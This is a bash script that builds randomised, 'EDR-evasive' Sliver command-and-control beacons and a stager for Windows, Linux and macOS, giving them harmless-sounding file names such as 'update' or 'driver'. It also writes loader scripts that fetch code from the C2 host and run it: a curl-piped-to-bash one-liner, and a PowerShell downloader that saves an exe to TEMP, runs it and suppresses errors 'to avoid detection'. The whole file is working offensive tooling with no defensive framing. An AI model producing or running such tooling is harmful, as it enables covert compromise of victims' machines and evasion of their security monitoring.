#!/bin/bash
# Advanced EDR-evasive beacon generator with dynamic randomization

# Dynamic configuration
BEACONS_DIR="/opt/beacons"
TIMESTAMP=$(date +%s)
C2_HOST=${1:-$(hostname -I | awk '{print $1}')}
C2_PORT=${2:-$(( 7000 + RANDOM % 3000 ))}
TEMP_DIR=$(mktemp -d)

# Generate unique random values for each execution
random_string() { 
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-8} | head -n 1
}

random_path() {
    local depth=$(( 1 + RANDOM % 3 ))
    local path="/"
    for ((i=0; i<depth; i++)); do
        path+="$(random_string $(( 4 + RANDOM % 8 )))/"
    done
    echo "${path}$(random_string $(( 5 + RANDOM % 10 )))"
}

# Generate unique profile for each beacon
generate_profile() {
    local type=$1
    local profile_name="profile-${type}-$(random_string 8)"
    local http_path1=$(random_path)
    local http_path2=$(random_path)
    local interval=$(( 30 + RANDOM % 120 ))
    local jitter=$(( 10 + RANDOM % 35 ))
    local headers=(
        "Accept-Language: en-US,en;q=0.$(( 7 + RANDOM % 3 ))"
        "X-Requested-With: XMLHttpRequest"
        "X-Client-ID: $(random_string 16)"
        "Cache-Control: max-age=$(( 100 + RANDOM % 900 ))"
        "X-$(random_string 8): $(random_string 12)"
    )
    
    # Select random subset of headers
    local selected_headers=()
    for ((i=0; i<$(( 2 + RANDOM % 3 )); i++)); do
        selected_headers+=("${headers[RANDOM % ${#headers[@]}]}")
    done
    
    # Format headers for JSON
    local json_headers="["
    for ((i=0; i<${#selected_headers[@]}; i++)); do
        json_headers+="\"${selected_headers[i]}\""
        if [[ $i -lt $((${#selected_headers[@]}-1)) ]]; then
            json_headers+=", "
        fi
    done
    json_headers+="]"
    
    # Create profile with unique properties for this beacon type
    cat > "$TEMP_DIR/$profile_name.json" << EOF
{
    "name": "$profile_name",
    "http_urls": ["$http_path1", "$http_path2"],
    "http_headers": $json_headers,
    "beacon_interval": $interval,
    "beacon_jitter": $jitter,
    "kill_date": "$(date -d "+$(( 30 + RANDOM % 90 )) days" +%Y-%m-%d)",
    "working_hours": {
        "start": "$(( 5 + RANDOM % 5 )):$(( RANDOM % 60 ))",
        "end": "$(( 16 + RANDOM % 8 )):$(( RANDOM % 60 ))"
    }
}
EOF
    
    # Install unique profile
    mkdir -p /root/.sliver/profiles/
    cp "$TEMP_DIR/$profile_name.json" /root/.sliver/profiles/
    echo $profile_name
}

# Random output filename generator
random_output_name() {
    local type=$1
    local names=(
        "update" "service" "client" "agent" "app" "system" 
        "monitor" "utility" "helper" "runtime" "driver" "module"
    )
    local name="${names[RANDOM % ${#names[@]}]}_$(random_string 4)"
    
    case "$type" in
        windows) echo "${name}.exe" ;;
        windows_dll) echo "${name}.dll" ;;
        linux) echo "${name}" ;;
        darwin) echo "${name}" ;;
        *) echo "${name}" ;;
    esac
}

# Ensure output directory exists
mkdir -p $BEACONS_DIR
mkdir -p $BEACONS_DIR/staged
mkdir -p $BEACONS_DIR/shellcode

# Generate each beacon type with unique profile and settings
echo "[+] Generating randomized, evasive beacons..."

# Windows EXE
win_profile=$(generate_profile "windows")
win_output=$(random_output_name "windows")
sliver generate --profile $win_profile --http $C2_HOST:$C2_PORT --os windows --arch amd64 \
    --format exe --save "$BEACONS_DIR/$win_output"
echo "[+] Windows beacon: $BEACONS_DIR/$win_output (Profile: $win_profile)"

# Windows DLL
dll_profile=$(generate_profile "windows_dll")
dll_output=$(random_output_name "windows_dll")
sliver generate --profile $dll_profile --http $C2_HOST:$C2_PORT --os windows --arch amd64 \
    --format shared --save "$BEACONS_DIR/$dll_output"
echo "[+] Windows DLL: $BEACONS_DIR/$dll_output (Profile: $dll_profile)"

# Linux binary
linux_profile=$(generate_profile "linux")
linux_output=$(random_output_name "linux")
sliver generate --profile $linux_profile --http $C2_HOST:$C2_PORT --os linux --arch amd64 \
    --format elf --save "$BEACONS_DIR/$linux_output"
echo "[+] Linux binary: $BEACONS_DIR/$linux_output (Profile: $linux_profile)"

# macOS binary
mac_profile=$(generate_profile "darwin")
mac_output=$(random_output_name "darwin")
sliver generate --profile $mac_profile --http $C2_HOST:$C2_PORT --os darwin --arch amd64 \
    --format macho --save "$BEACONS_DIR/$mac_output"
echo "[+] macOS binary: $BEACONS_DIR/$mac_output (Profile: $mac_profile)"

# Generate dynamic stagers with variable formats
stager_profile=$(generate_profile "stager")
stager_win=$(random_output_name "windows")
sliver generate stager --profile $stager_profile --http $C2_HOST:$C2_PORT --os windows --arch amd64 \
    --format exe --save "$BEACONS_DIR/staged/$stager_win"
echo "[+] Windows stager: $BEACONS_DIR/staged/$stager_win (Profile: $stager_profile)"

# Create randomized loader scripts
echo "#!/bin/bash
# $(random_string 32)
# $(date)
sleep \$((RANDOM % 3))
curl -s http://$C2_HOST:$C2_PORT$(random_path) -H \"$(random_string 8): $(random_string 12)\" | bash
# $(random_string 24)" > "$BEACONS_DIR/loader_$(random_string 8).sh"
chmod +x "$BEACONS_DIR/loader_$(random_string 8).sh"

# Random PowerShell stager with junk and evasion
cat > "$BEACONS_DIR/loader_$(random_string 8).ps1" << EOF
# $(random_string 32)
# Generated: $(date)
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
\$r = New-Object -TypeName Random
Start-Sleep -Milliseconds \$r.Next(100, 2000)
\$wc = New-Object Net.WebClient
\$wc.Headers.Add("$(random_string 8)", "$(random_string 12)")
\$url = 'http://$C2_HOST:$C2_PORT$(random_path)'
\$outpath = "\$env:TEMP\$(random_string 8).exe"
try {
    # $(random_string 16)
    \$wc.DownloadFile(\$url, \$outpath)
    Start-Sleep -Milliseconds \$r.Next(500, 3000)
    Start-Process -NoNewWindow -FilePath \$outpath
} catch {
    # Error handling to avoid detection
    # $(random_string 24)
}
EOF

# Create index of generated files for reference
echo "[+] Creating reference file with beacon details"
cat > "$BEACONS_DIR/reference.txt" << EOF
C2 Server: $C2_HOST:$C2_PORT
Generated: $(date)

Windows EXE: $win_output (Profile: $win_profile)
Windows DLL: $dll_output (Profile: $dll_profile)
Linux Binary: $linux_output (Profile: $linux_profile)
macOS Binary: $mac_output (Profile: $mac_profile)
Windows Stager: staged/$stager_win (Profile: $stager_profile)

All profiles are uniquely generated with randomized settings.
EOF

# Cleanup
rm -rf $TEMP_DIR
echo "[+] Beacon generation complete with dynamic fingerprint avoidance"